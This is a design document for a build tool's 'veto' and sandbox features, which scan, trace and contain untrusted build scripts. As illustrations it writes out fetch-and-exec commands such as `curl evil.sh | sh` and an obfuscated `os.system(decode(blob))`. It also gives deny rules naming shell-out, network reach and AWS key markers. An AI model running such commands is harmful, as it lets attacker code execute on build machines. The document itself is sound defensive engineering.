# Build veto and sandbox — vetting and containing an untrusted build

aeb can treat its own build input as **untrusted**, on demand, and refuse or
contain a build the way the untrusted `.ae` graph cannot override. This doc is
the reference for that capability: what it inspects, the CLI, the operator
policy surface, and — crucially — the boundary of what it can and cannot
promise.

Companion docs: [`run-policy-class-and-cloud-leverage.md`](run-policy-class-and-cloud-leverage.md)
(the sovereign-agent + policy-class design — the agent is the sharpest case,
since it builds *internet-supplied* trees) and [`directions.md`](directions.md)
(where this sits in the rings).

> History note: this doc was formerly organized as a numbered build-order
> (`layers 0/1a/1b/2b/3`, `tiers A/B/C`). Those numbers were the *sequence we
> built things in*; they are retired here in favour of capability names. The
> old labels still appear in the CHANGELOG and git history — the mapping is in
> "The capabilities at a glance" below.

## Why aeb itself is a supply-chain surface

The motivating threat (sharpened by the June-2026 npm wave — `binding.gyp`
"Phantom Gyp" execution, pre/postinstall credential harvesters, self-spreading
worms that target CI/CD secrets and even inject backdoors into AI coding
assistants): **an attacker who controls the build description gets code
execution at *build time* on the agent or dev box.** For aeb the build
description is the `.build.ae` graph, every `.ae` it imports, and anything in
the source set a build step reads (a `binding.gyp`, a vendored `package.json`
with a `postinstall`, a `regen` that shells out). aeb is not immune by being
Aether-native — a malicious `.build.ae` can `os.system("curl … | sh")`,
declare `extern syscall`, or reach the network just as a malicious
`package.json` can.

So aeb needs to **treat its own build input as untrusted**, on demand. That is
what `--vet` and `--sandbox` are.

(Disambiguation: the policy-class doc also says "veto", but that's the
*token/claim* veto — refusing an unauthenticated or over-scoped dispatch at the
door. This doc is the *build-content* veto — having prepared the tree, does
policy permit *this build* to run. Two different gates: auth-veto at the door,
build-veto after prepare.)

## The load-bearing invariant — enforcement lives in the trusted harness

The single property everything here depends on:

> **The veto and the sandbox are enforced by the harness that *invokes* the
> build — not by anything the untrusted `.ae` graph can read, call, or
> re-declare.** A verdict reached by the trusted side cannot be overridden by
> the code it is about to compile or run.

This is why a `.build.ae` "self-certifying" is worthless, and why every
enforcement point is *outside* the untrusted graph's reach:

- **Source scans** (tree/patch rules, external scanners) run on the *source
  bytes*, before `ae` ever compiles them — the untrusted code has not executed.
- **The AST veto** has **`ae` itself** (the trusted compiler) emit the typed
  AST via `--emit=ast`; `lib/veto` walks it before the run-compile. The
  untrusted graph can't veto its own veto: it neither produces the AST (the
  compiler does) nor reaches the policy that reads it.
- **The SBOM/intent traces** resolve coordinates / record intent in the
  harness; the build's effects never fire.
- **The sandbox** wraps the build in a `spawn_sandboxed` child whose grant list
  lives in shared memory the child *cannot reach* — it is structurally unable
  to widen its own permissions.

`--vet`/`--sandbox` is an operator decision at launch; a dispatch or a
`.build.ae` cannot clear it.

## The capabilities at a glance

Six complementary capabilities, each named by **what it inspects or
enforces**. Use any subset; a strong build composes the static vetoes with the
runtime sandbox. They run earliest-to-latest in the build's life:

| Capability | CLI | What it inspects / does | Reads | (former label) |
|---|---|---|---|---|
| **Tree & patch rule scan** | agent-side (`lib/agent`) | regex/file/path/size rules over the source bytes / the applied patch | source bytes | 1a / Tier A |
| **External-scanner hook** | `--vet-tool '<cmd>'` | run an operator-chosen scanner (semgrep, a secret/CVE tool); non-zero exit vetoes | source tree | 1b |
| **AST veto** | `--vet [--veto-policy <f>]` | walk `aetherc --emit=ast`: deny extern/exec/net/import, banned substrings, a coordinate allowlist | resolved AST symbols | 2b |
| **Dependency SBOM / CVE** | `--resolve-only [--sbom-json <f>]` | resolve the dependency-coordinate closure (transitive) without building; a scanner judges it | which dep *versions* | Tier B |
| **Intent trace** | `--trace-intent [--intent-json <f>]` | run against a doppelganger `std.os` that *records* `os.system`/`exec`/`run*` instead of executing — what the build *would do* | build *behaviour* | Tier C |
| **Runtime sandbox** | `--sandbox [--sandbox-profile <f>]` | run the build under `spawn_sandboxed` (LD_PRELOAD + kernel seccomp); a denied syscall dies at the libc/kernel boundary | runtime syscalls | 3 |

The static vetoes (everything but the sandbox) *read and decide*; the sandbox
*enforces* on the running build what the readers couldn't see. Why both are
needed is the subject of "Veto is policy; containment is enforcement" below.

```
untrusted tree on disk
   │
   ├─ tree & patch rule scan      (source bytes — agent-side)
   ├─ external-scanner hook        (--vet-tool: semgrep/CVE/secret; exit code = verdict)
   ├─ dependency SBOM / CVE        (--resolve-only: resolve closure, scanner judges)
   ├─ intent trace                 (--trace-intent: doppelganger std.os records intent)
   │
   ae compile each .ae → .c        (the AST veto runs here, on --emit=ast)
   ├─ AST veto                     (--vet: extern/exec/net/import/banned/coord on the AST)
   │
   gcc link → per-node orchestrator binary
   │
   └─ runtime sandbox              (--sandbox: spawn_sandboxed, deny-by-default, no tcp,
                                    seccomp fork/clone fence — contains the whole subtree)
```

---

## SCOPE — read this first, it's the whole point

These capabilities guard against **build-grammar escapes**: things the
`.build.ae` / `.tests.ae` *orchestration* does that the operator doesn't want a
node to do — shell out to something dangerous, reach the network, pull a
banned/known-vulnerable dependency, write outside the workdir, embed a secret,
dispatch onward.

They do **NOT** guard against **the application being built being a trojan.**
Nothing here inspects, or can vouch for, the runtime behaviour of the
*compiled artifact*. A `.build.ae` that cleanly runs `javac` on Java source
passes every veto in this doc — and that Java can still be malware. The veto
sees *the build's intent*, not *the program's intent*.

Stated bluntly so no one mistakes it:

> **In scope:** "this *build* would `curl evil.sh | sh`, or link a CVE'd
> dependency, or write to `/etc`." → vetoable here.
>
> **Out of scope:** "the binary this build produces exfiltrates data when run."
> → NOT addressed here. That needs artifact scanning / sandboxed *execution* of
> the output — a different problem with different (and weaker) guarantees.

Conflating the two is how a veto framework manufactures false confidence. A
green veto means *the build process was acceptable to the operator* — it says
nothing about whether the software is safe to run. Keep that line bright.

---

## The static vetoes

All of these *read and decide* before (or instead of) running the build. They
share the trusted-harness invariant and the out-of-tree policy surface.

### Tree & patch rule scan

The agent's pre-build gate (`lib/agent` `_veto_run_rules`) runs a data-driven
rule list over the **prepared tree** and/or the **applied patch** before the
build. Each rule is `(id, scope, pattern, reason)`; a hit on any rule vetoes
with that reason. Scopes: `tree` (grep the worktree), `patch` (grep the applied
delta — highest signal: the untrusted pre-integration change *introduced* the
hit), `file` (a file-existence glob), `patchpath` (the patch touches a
disallowed path). Built-in rules cover the June-2026 supply-chain
install-script class: committed-secret markers (RSA/OpenSSH/PGP keys, AWS
access-key id), a `binding.gyp` present (native-addon install-time build
script), `pre/postinstall` manifest hooks, a `curl|sh` fetch-and-exec, a
patch-introduced `extern`, and an opt-in tree-size cap
(`AEB_AGENT_MAX_TREE_MB`). Operators extend via `AEB_AGENT_VETO_PATTERNS`.
Pure + unit-tested; only the grep touches the filesystem.

### External-scanner hook (`--vet-tool '<cmd>'`)

`aeb --vet-tool '<cmd>'` (repeatable) runs an operator-chosen scanner with the
build root as cwd **before** the build; a **non-zero exit vetoes** (REFUSED,
exit 3). The command is `eval`'d (operator-trusted — it came from the CLI, not
the build graph), so real scanner expressions work:

```sh
aeb --vet-tool 'semgrep --error .'    app/.build.ae
aeb --vet-tool '! grep -rq AKIA .'    app/.build.ae   # veto if an AWS-key marker is present
```

**Fail-closed:** a tool that can't run — command-not-found (exit 127), or any
error — vetoes too (a vet you asked for that can't run must not silently pass).
Naming a tool implies `--vet`. The principle: **aeb invokes a SAST engine
rather than becoming one** — the same principle the SBOM/CVE capability leans
on for its verdict.

### AST veto (`--vet [--veto-policy <f>]`)

`aeb --vet [--veto-policy <path>]` runs the `tools/aeb-vet` gate before any
build: it resolves the operator policy, refuses an in-tree policy path,
enforces the zero-rules lint, runs `lib/veto`'s `decide()` per target on the
emitted AST, and **exits 3** (refused) before the build.

The veto consumes **`aetherc --emit=ast`** — the trusted compiler emits the
name-resolved, typed AST as JSON; `lib/veto` walks the nodes. Because the
callee is *resolved*, aliasing/concat can't dodge it. Rules: deny
`extern`/`exec`/`net`/`import`, a `banned\t<substring>` rule against literal
args, and a positive **coordinate allowlist** (`coord_verb`/`coord_allow` —
gate a resolver verb's literal coordinate to an allowed *prefix*; the
attacker-immovable stem). Nodes from trusted `--lib` roots (the SDKs) are
origin-exempt; only untrusted-tree nodes trip.

**Fail-closed by construction:** non-zero `aetherc` exit (no AST) → veto; an
indirect (function-pointer) call in untrusted code → veto; a computed arg to an
exec/net verb → veto; a deny-category node with NULL origin → veto + surface.

### Dependency SBOM / CVE (`--resolve-only [--sbom-json <f>]`)

`aeb --resolve-only [--sbom-json <path>]` resolves the target's dependency
coordinates to their full **transitive closure** and emits it as JSON
(`{"maven":["g:a:v",…]}`) **without building**. `tools/aeb-sbom` greps the
coordinate `dep()`s statically (no build execution — the read-don't-run
discipline) and runs `aeb-resolve.jar --output sbom`.

aeb emits the SBOM; **the verdict is delegated to a scanner** via the
external-scanner hook (the same "invoke a SAST engine" principle):

```sh
aeb --resolve-only --sbom-json out.json app/.build.ae
aeb --vet-tool 'grype sbom:out.json --fail-on high'  app/.build.ae
```

This catches the *which dependency versions* class (known-CVE, banned) that the
AST veto and the sandbox **cannot see** — they inspect build *behaviour* /
symbols, not which resolved versions enter the closure. Maven today; cargo
(`.crate.ae`) and npm (`npm:`) follow the same `--output sbom` shape.

### Intent trace (`--trace-intent [--intent-json <f>]`)

`aeb --trace-intent [--intent-json <path>]` compiles+runs the leaf against a
**doppelganger `std.os`** (`lib/veto_trace_os`) whose `os.system` / `os.exec` /
`os.run*` **RECORD** the command to a trace file instead of **EXECUTING** it,
then emits the recorded intent as JSON (`{"system":[…],"exec":[…],"run":[…]}`).
You see what the build *would do* without its effects firing — an evil
`curl|sh` is recorded, not run.

#### Why aeb can do this cheaply (the Action!/Interface-Builder trick)

This is the same move as Denison Bollay's Action! (1988): interpret the *same
source* into an *alternate context*; and Paul's tsyne WYSIWYG designer, which
interprets a `.ts` UI script into a doppelganger Tsyne API that records widget
metadata instead of drawing widgets. The tsyne designer pays an **impedance
cost** — it `tsc`-transpiles then *regex-rewrites* the output to swap the
`require`. **aeb pays no such cost.** Which library an `.ae` sees is purely the
`--lib` search path, so swapping in a doppelganger is just a `--lib` flag —
same source, different library, **zero source/output rewriting.**

The implementation insight: **`std.os` is the universal shell-out chokepoint.**
Every SDK (gcc/javac/cargo/curl) routes its commands through `os.system` /
`os.exec`, so one shadowed `std.os` captures the whole build's intent with **no
SDK edits**. (`tools/aeb-trace` stages the doppelganger `std/`, `transform-ae`s
the `aeb(cap)` node, wraps it in a `main()` harness, and compiles with a
**cwd-local `--lib .`** — empirically the only form that shadows the builtin
stdlib.)

#### Honest limits (the whole point of a read-and-decide gate)

It is **dynamic abstract interpretation of the build orchestration** — it
faithfully traces *what the build declares/reaches on the path taken*. It is
**not** a soundness proof:

1. **Orchestration only, never the app.** It sees "the build runs `javac` on
   these files" — never what the *compiled Java* does. (The SCOPE boundary,
   restated at the mechanism level.)
2. **One path, not all paths.** `if env(X) { sys(a) } else { sys(b) }` records
   the branch *this run* takes — *a* trace, not *every* trace.
3. **Opaque computation defeats reading (not detection).** `os.system(decode(
   blob))` records `os.system(<computed>)` — policy can still flag opacity as a
   vetoable signal, but it cannot always *read* what would run.

So the intent trace is a strong veto *input* for build-grammar escapes,
complementary to the AST veto's symbol view — not a proof.

---

## The policy surface — an out-of-tree policy `.ae` (DSL), not a flag list

The deny/allow policy is **not** a CLI category-list (`--deny extern,exec,…`)
and **not** an external `deny.toml`. Both were rejected: a CLI list is
**typo-prone and fails open** (`--deny exce` silently enforcing nothing is the
worst outcome for a security gate); an external config format violates aeb's
founding rule (*the `.ae` file is the single source of truth; external formats
only via shell-out*).

So the policy is an **aeb-native closure-DSL `.ae` file** served by the
`lib/veto` SDK — same *shape* as a `.build.ae`, but with one critical
difference in **where it lives**:

> **NOT a dot-prefixed in-tree target.** aeb scans every dot-prefixed `.ae`
> under cwd and makes it a DAG **node** ("filename is the route"). A policy must
> be the *opposite* — it polices the tree, so it must not be a node *in* the
> tree, and an untrusted dispatch must not be able to ship its own. So the
> policy is a **plainly-named `.ae` at an operator-trusted, out-of-tree
> location**, loaded *as policy* by `--vet`, never scanned as a target:
>
> - `aeb --vet --veto-policy /etc/aeb/policy.ae` (explicit operator path), or
> - `$AEB_HOME/veto/default.ae` (the shipped default), or
> - `.aeb/veto/policy.ae` (per-project, under the already-non-scanned `.aeb/`).
>
> aeb **refuses** a `--veto-policy` path that resolves inside the build tree
> (the requester writing their own exemption = gate dead).

```aether
// /etc/aeb/policy.ae (or $AEB_HOME/veto/default.ae) — operator policy.
// A normal .ae aeb compiles+runs AS POLICY — NOT a dot-prefixed build node.
// Lives outside the build tree; reviewed in PRs; version-controlled; typed.
import veto (policy, deny, banned, allow_exec, allow_import, coord_verb, coord_allow, scope)
main() {
    p = veto.policy()
    veto.deny(p, "extern")               // no raw C escapes in untrusted code
    veto.deny(p, "net")                  // no tcp/http reach
    veto.deny(p, "exec")                 // deny shell-out by default…
    veto.allow_exec(p, "gcc")            // …except the toolchain
    veto.allow_exec(p, "javac")
    veto.allow_import(p, "std.string")   // exempt this module from deny-import
    veto.banned(p, "evil.com")           // substring in any literal arg → veto
    veto.coord_verb(p, "maven_dep")      // gate this resolver verb's coordinate…
    veto.coord_allow(p, "org.corp:")     // …to this allowed prefix (pinned stem)
}
```

Three properties this buys:

1. **Self-vetting / lint (what vets the vetter).** The policy `.ae` *is Aether*
   — `aetherc` typechecks it when aeb compiles it. A malformed policy
   (`veto.dney(...)`, wrong arity, an unknown setter) is a **compile error**,
   not a silent empty policy. aeb adds a lint: **`--vet` with a policy that
   resolves to zero rules is itself an error** (vet-requested-but-denies-nothing
   → refuse). Fail-closed by construction.
2. **Outside the source tree.** Operator-owned, resolved from a trusted path,
   never from the untrusted tree; aeb refuses an in-tree path. Same provenance
   rule as the `--lib` SDK roots.
3. **Cached once compiled.** The policy `.ae` → compiled policy is a
   content-addressed build product (key on `sha256(policy.ae) + toolchain`),
   compiled once and reused until the source changes.

### The operator surfaces compose (and are kept separate on purpose)

An operator drives three *distinct but composable* surfaces — deliberately
**not** merged into one mega-object: each is proven and self-contained, each
fails closed on its own, and the launch flags make the intent explicit:

| Surface | Capability | Where it lives | Default |
| --- | --- | --- | --- |
| **veto policy** (`veto.*` rules) | tree-scan + AST veto | `--veto-policy <f>` → `$AEB_HOME/veto/default.ae` → built-in | deny `extern`+`exec` |
| **vet-tool(s)** (external scanners) | external-scanner hook | `--vet-tool '<cmd>'` (repeatable, CLI) | none (opt-in) |
| **sandbox profile** (`sandbox.*` grants) | runtime sandbox | `--sandbox-profile <f>` → `$AEB_HOME/sandbox/default.ae` → built-in | conservative, **no tcp** |

Both `default.ae` files are operator-trusted, **out of tree**, and refused if
their path resolves *inside* the build tree (same `_is_inside` check both gates
use). A fully-armed invocation uses them together — static vetoes first, then
the build runs contained:

```sh
aeb --vet \
    --veto-policy     /etc/aeb/veto.ae     \   # AST veto: deny rules + coord allowlist
    --vet-tool        'semgrep --error .'  \   # external scanner
    --vet-tool        '! grep -rq AKIA .'  \   # a second scanner
    --sandbox \
    --sandbox-profile /etc/aeb/grants.ae   \   # deny-by-default grants (no tcp)
    app/.build.ae
```

`--vet` and `--sandbox` are independent — use either alone, or together. Each
flag-with-a-file implies its gate. Copy a `default.ae` and tighten it for a
custom policy (e.g. `sandbox.grant_tcp(s, "crates.io")` for a build that
legitimately fetches from a registry).

---

## Veto is policy; containment is enforcement — they are different layers

The static vetoes are **policy gates** — they inspect (the tree, the resolved
closure, a recorded trace, the AST) and *decide* whether to proceed. That makes
them fundamentally **bounded by what they can read.** A `.build.ae` doing
`os.system(decode(blob))` records `os.system(<computed>)`; a build that
*computes* `curl evil.sh | sh` at runtime is invisible to every reader here.
That is not a gap to be closed by a smarter veto — it is the nature of a
read-and-decide gate.

What *does* close it is **containment** — enforcing limits on the running build
at a layer it cannot reason its way around. Three containment surfaces, stacked
as defense in depth, each catching what the layer above is blind to:

| Layer | Mechanism | Catches | Blind to |
|---|---|---|---|
| **Static vetoes** (policy; pre-build) | tree-scan / external-tool / AST / SBOM / intent-trace | *declared / readable* build-grammar escapes | computed/opaque escapes; the compiled artifact |
| **Aether sandbox** (per-process; LD_PRELOAD + seccomp) | `spawn_sandboxed(grants, …)` | *runtime* fs/exec/tcp/env/fork attempts by the build **and its children** — including computed ones the veto couldn't read | a statically-linked tool issuing raw syscalls the preload can't see; the artifact's later behaviour |
| **Container / OS** (kernel namespaces, caps, netns) | `itests/agent-container` hardening | everything that escapes the preload — kernel-level blast radius | (this is the floor) |

### The runtime sandbox (`--sandbox [--sandbox-profile <f>]`)

`aeb --sandbox` runs the whole build under Aether's `spawn_sandboxed` with a
deny-by-default grant profile. Because `spawn_sandboxed` sets `LD_PRELOAD` +
the grant-SHM in the child's env before exec, and the `execve` interceptor
re-checks every subsequent exec, **one spawn contains the entire build
subtree** — `aeb → gcc → cc1`, `aeb → javac`, etc. all run under the same
grants, each `connect()`/`open()`/`execve()`/`fork()` checked. A denied syscall
(connect to an un-granted host, write outside `target/`, exec off the
allowlist) dies at the boundary regardless of how the build computed it. That
is what makes "a clean veto is not a clean program" survivable.

Grants are `(category, pattern)` pairs: `fs_read`, `fs_write`, `exec`, `tcp`,
`tcp_listen`, `env`, `fork`, `native` (`lib/sandbox`). The profile resolves
out-of-tree (`--sandbox-profile` → `$AEB_HOME/sandbox/default.ae` →
conservative built-in, **no tcp**), an in-tree profile is refused, and the
maintainer (in-tree) can only **narrow** within the operator ceiling
(`sandbox.intersect` — the operator-ceiling ∩ maintainer-request model; see
[`capability-entrypoint.md`](capability-entrypoint.md)). A profile that resolves
to zero grants, or is grant-all, is flagged.

Two enforcement details worth stating:

- **Kernel-level fork fence (aether ≥ 0.230.0).** The `fork`/process-creation
  denial is a **seccomp-bpf filter** installed post-fork/pre-exec — not just an
  LD_PRELOAD libc-symbol intercept, which was bypassable by a raw
  `syscall(SYS_clone3, …)` or glibc's inline `__vfork`. gcc uses exactly those
  paths to spawn `cc1`/`as`/`ld`, so before the fence a no-`fork` grant didn't
  actually stop process creation. Now it does, at the kernel, fail-closed.
- **Linux-only.** `spawn_sandboxed` is `fork`/`shm_open`/`LD_PRELOAD`/seccomp;
  on non-Linux `--sandbox` refuses (use the container/VM layer there). It is
  the *middle* layer — a statically-linked tool issuing raw syscalls, or
  resource exhaustion (fork-bomb, fill the disk), is the container layer's job.

### Where the build is hosted — `aeb(cap)`

Under `--sandbox` the build leaf is hosted as an Aether lib (no binary `main`)
and aeb calls its exported `aeb(cap)` in-process, passing the operator-minted
capability — the build *receives* its authority, never constructs it. The grant
grammar is the honest layer; the LD_PRELOAD/seccomp enforcement is the
un-forgeable fence. Full design + the no-pre-entry-execution finding that makes
it sound: [`capability-entrypoint.md`](capability-entrypoint.md).

---

## A vetoed build is a refusal, not a failure

Every gate distinguishes **refused-on-policy** from **ran-and-broke**:
`aeb --vet` exits **3** (refused) before any build; the agent returns a
distinct `vetoed`/HTTP 422. The originator can tell "this agent's policy
refused your build" from "your build ran and failed." Run cheap→expensive so a
blatant tree-scan hit short-circuits before the costly resolve/trace work; the
first refusal wins.

## The one-line summary

The static vetoes guard the **build's behaviour** — its declared/readable
escapes — but **never the application being built.** A clean veto is not a
clean program; keep that boundary bright. The thing that survives a build the
veto *can't read* (a computed escape, an opaque command) is **containment**,
and the `spawn_sandboxed` sandbox is the layer that contains the whole subtree
at the libc/kernel boundary, with the container/namespace layer below it. Veto
decides *what may build*; the sandbox decides *what a build may do*.
